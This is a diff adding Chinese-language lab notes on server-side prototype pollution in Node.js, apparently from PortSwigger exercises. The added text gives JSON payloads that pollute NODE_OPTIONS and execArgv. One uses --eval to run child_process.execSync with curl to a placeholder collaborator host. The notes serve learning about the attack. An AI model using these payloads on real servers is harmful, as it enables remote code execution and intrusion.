@@ -29,3 +29,19 @@ Lab: Bypassing flawed input filters for server-side prototype pollution
 这时候看看是不是会改变，因为默认情况下，status = 400.
 status为0表示恢复默认状态
 "__proto__":{"status":0}
+
+
+lab: Remote code execution via server-side prototype pollution
+基本思路是: 生成新node进程的时候，通常会携带env和options，所以通常的思路是从这两个地方去入手。
+
+那我们来看看常见的注入手法有哪些:
+方法一:通过NODE_OPTIONS
+"NODE_OPTIONS": "--inspect=4y3mrgzqyrvew87hisf0o90znqthh6\"\".oastify\"\".com" (这种检测方法在burp插件'server side prototype pollution'中会看到)
+https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652474207&idx=1&sn=18f73dec3bb6f7dfebf22d9874915402&chksm=f25828ecc52fa1faf01a14d98adaab9b249dc52abe54081b49cf0caa727f3e4c82041a54adfc&mpshare=1&scene=1&srcid=0315UPLPviLcoVNXJATXjsAj&sharer_sharetime=1678836964275&sharer_shareid=3602b40f528cceb40223b4f505d4154b&exportkey=n_ChQIAhIQGqekgy8OBwvW%2BVn4HtAG5hKZAgIE97dBBAEAAAAAAB2fCchw5CsAAAAOpnltbLcz9gKNyK89dVj0BTde%2FrysGM041yaxUG0klPlqDshGPx5F6hPaxmucnSaZYD%2FzjMwJvRTSphbWFjngcgVmlYlSdN0eC13zzef1GWgyRSQiqmbq9UPnW9tHNr7MG15a%2FvXwkPZ0gpAcmcuCo3KSzncsvVK%2BBxUztGviJ9%2FueDkn1utW%2B7swGIVQ05rkpK1ohDxn2EsJ2yo1ppkPkZtNC5M6E1k7z0jN%2FoHrtKufqIE6zIe2hh1YnTMFFxcZ1hiCKsZ42zx4SgzK7Y3MloUrFVscr7Pv4W%2FDmJusMFv0Rk%2Bu7i5FknJU6x6FL1BQPQtTnL3ygFbDEA%2FBFKiaOR%2Bg&acctmode=0&pass_ticket=kAAQAJXDOy1w7urZO0vVzCxZACwdkoTbRI%2FPi7mLF18O6DS4%2BCsup2EfEbinK3w1N%2FIN758ga8%2FcbBrUtpugeA%3D%3D&wx_header=0#rd
+
+方法二:通过execArgv
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
